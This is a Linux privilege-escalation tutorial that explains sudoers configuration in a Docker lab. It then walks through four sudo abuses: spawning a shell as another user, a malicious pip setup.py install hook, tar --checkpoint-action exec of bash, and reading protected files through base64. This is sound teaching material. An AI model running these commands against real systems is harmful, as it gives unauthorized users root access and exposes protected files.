                      ____________________________

                       LINUX PRIVILEGE ESCALATION
                           SUDO Exploitation

                            Leonardo Tamiano
                      ____________________________


Table of Contents
_________________

1. Docker Setup
2. What is SUDO?
3. SUDO Configuration
4. Exploiting SUDO
.. 1. Example 1 - ALL
.. 2. Example 2 - pip
.. 3. Example 3 - tar
.. 4. Example 4 - base64
5. References


1 Docker Setup
==============

  To play with `sudo' it is helpful to create a docker environment as
  follows.

  - First we build the image and start the container

    ,----
    | docker build -t sudo-lab .
    | docker run -td --name sudo-lab --rm sudo-lab
    `----

  - Then we execute a shell within the docker environment

    ,----
    | docker exec -it sudo-lab "/bin/bash"
    `----

  - Finally we stop the container once we're done

    ,----
    | docker container stop sudo-lab
    `----


2 What is SUDO?
===============

  An important subystem that relates to permissions is the `sudo'
  functionality.

  ,----
  | sudo -> SuperUserDO
  `----

  The sudo utility can be download differently depending on the
  distribution and the package manager in use.

  ,----
  | # arch linux
  | pacman -S sudo   
  | 
  | # ubuntu
  | apt update
  | apt install sudo 
  `----

  Once installed, it is possible to access the sudo binary

  ,----
  | root@76081c1d3033:/# which sudo
  | /usr/bin/sudo
  `----

  To check the configuration for the sudo program, execute `sudo -l'.

  To execute this command need to know the `password' of the user. This
  is used for `authentication' purposes by the sudo subsystem.

  ,----
  | root@76081c1d3033:~# sudo -l
  | Matching Defaults entries for root on 76081c1d3033:
  |     env_reset, mail_badpass,
  |     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
  | 
  | User root may run the following commands on 76081c1d3033:
  |     (ALL : ALL) ALL
  `----

  The configuration is found within `/etc/sudoers'


3 SUDO Configuration
====================

  To edit the configuration we can use the program `visudo'.

  ,----
  | root@76081c1d3033:~# visudo
  | visudo: /etc/sudoers.tmp unchanged
  `----

  ----------------------------------------------------------------------

  Notice the initial flags:

  ,----
  | Defaults        env_reset
  | Defaults        mail_badpass
  | Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  `----

  These means:

  - `env_reset'

    commands are executed within a minimal shell enviroment

  - `mail_badpass'

    send mail to the mailto user if the user running sudo does not enter
    the correct password.

  - `secure_path'

    used as the PATH environment variable for the commands you use
    running sudo.

  ----------------------------------------------------------------------

  Then within the file we see three main rows, each of which specifies a
  policy to be implemented in sudo.

  ,----
  | # User privilege specification
  | root    ALL=(ALL:ALL) ALL
  | 
  | # Members of the admin group may gain root privileges
  | %admin ALL=(ALL) ALL
  | 
  | # Allow members of group sudo to execute any command
  | %sudo   ALL=(ALL:ALL) ALL
  `----

  These policy specifies how the sudo command will be used and what
  different users can do with the sudo command.

  The rules are checked in order, and the last rule that matches is
  used. The rules have the following structure, with extra added
  options.

  ,----
  | user host = (runas) command
  `----

  For example, consider the following

  ,----
  | ubuntu ALL=(ALL) NOPASSWD: ALL
  `----

  It means

        The user ubuntu on any host may run any command as any
        user without a password”

  Specifically:

  - The first `ALL' refers to hosts
  - The second `ALL' to target users
  - The last `ALL' to allowed commands
  - The `NOPASSWD': is an extra option to not require any passwords


4 Exploiting SUDO
=================

  Once we login into a system, it is extremely important to enumerate
  our sudo capabilities by executing a `sudo -l' command. Depending on
  the outcome of such command we might be able to elevate our
  privileges.

  To execute this command need to know the `password' of the user. This
  is used for `authentication' purposes by the sudo subsystem.

  To further illustrare this point, various examples shall now be
  presented.


4.1 Example 1 - ALL
~~~~~~~~~~~~~~~~~~~

  `sudo -l'

  ,----
  | Matching Defaults entries for www-data on bashed:
  | env_reset, mail_badpass,
  | secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  | 
  | User www-data may run the following commands on bashed:
  | (scriptmanager : scriptmanager) NOPASSWD: ALL
  `----

  ----------------------------------------------------------------------

  To exploit it we can execute any command as the user
  `scriptmanager'. For example, we can execute the following

  ,----
  | sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
  `----


4.2 Example 2 - pip
~~~~~~~~~~~~~~~~~~~

  `sudo -l'

  ,----
  | Matching Defaults entries for homer on canape:
  | env_reset, mail_badpass,
  | secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  | 
  | User homer may run the following commands on canape:
  | (root) /usr/bin/pip install *
  `----

  ----------------------------------------------------------------------

  To exploit it the idea is described as follows

  - First we create a folder

    ,----
    | mkdir ~/test
    `----

  - Then we create the malicious file `setup.py'

    ,----
    | from setuptools import setup
    | from setuptools.command.install import install
    | import os
    | 
    | class Install(install):
    |   def run(self):
    |     install.run(self)
    |     os.system('whoami > /tmp/test')
    | 
    | setup(name='Test', version='0.0.1', license='MIT', zip_safe=False, cmdclass={'install': Install})
    | 
    `----

  - Finally we install the package and execute the code

    ,----
    | cd ~/test
    | sudo /usr/bin/pip install . --upgrade --force-reinstall --break-system-packages
    `----


4.3 Example 3 - tar
~~~~~~~~~~~~~~~~~~~

  `sudo -l'

  ,----
  | Matching Defaults entries for ubuntu on de5117799c31:
  |     env_reset, mail_badpass,
  |     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
  | 
  | User ubuntu may run the following commands on de5117799c31:
  |     (root) /usr/bin/tar -cvf *
  `----

  ----------------------------------------------------------------------

  To exploit we can use the `--checkpoint-action' flag, that will
  execute a given file, such as the `/bin/sh' shell.

  ,----
  | sudo /usr/bin/tar -cvf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
  `----


4.4 Example 4 - base64
~~~~~~~~~~~~~~~~~~~~~~

  `sudo -l'

  ,----
  | Matching Defaults entries for ubuntu on de5117799c31:
  |     env_reset, mail_badpass,
  |     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
  | 
  | User ubuntu may run the following commands on de5117799c31:
  |     (root) /usr/bin/base64
  `----

  ----------------------------------------------------------------------

  ,----
  | sudo base64 <FILE_TO_READ> | base64 --decode
  `----


5 References
============

  - <https://www.sudo.ws/docs/man/1.8.15/sudoers.man/>
  - <https://toroid.org/sudoers-syntax>
  - <https://gtfobins.github.io/>
  - <https://github.com/0x00-0x00/FakePip/tree/master>
